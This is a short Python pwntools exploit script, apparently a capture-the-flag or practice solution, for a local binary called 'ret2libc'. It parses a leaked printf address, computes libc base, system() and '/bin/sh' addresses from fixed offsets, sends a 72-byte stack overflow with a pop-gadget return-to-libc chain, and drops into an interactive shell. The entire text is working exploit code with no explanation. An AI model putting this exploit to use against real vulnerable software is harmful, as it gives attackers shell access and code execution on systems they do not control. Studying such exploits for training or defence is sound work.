from pwn import *

p = process('./ret2libc')
p.recvuntil(": ")
printf_addr = p.recvuntil("\n")
printf_addr = int(printf_addr, 16)

libc_base = printf_addr - 0x54340
system_addr = libc_base + 0x46590
binsh = libc_base + 0x180543
pr = 0x400783

print hex(libc_base)
print hex(system_addr)
print hex(binsh)
print hex(pr)

payload = "\x90"*72
payload += p64(pr)
payload += p64(binsh)
payload += p64(system_addr)

p.send(payload)
p.interactive()
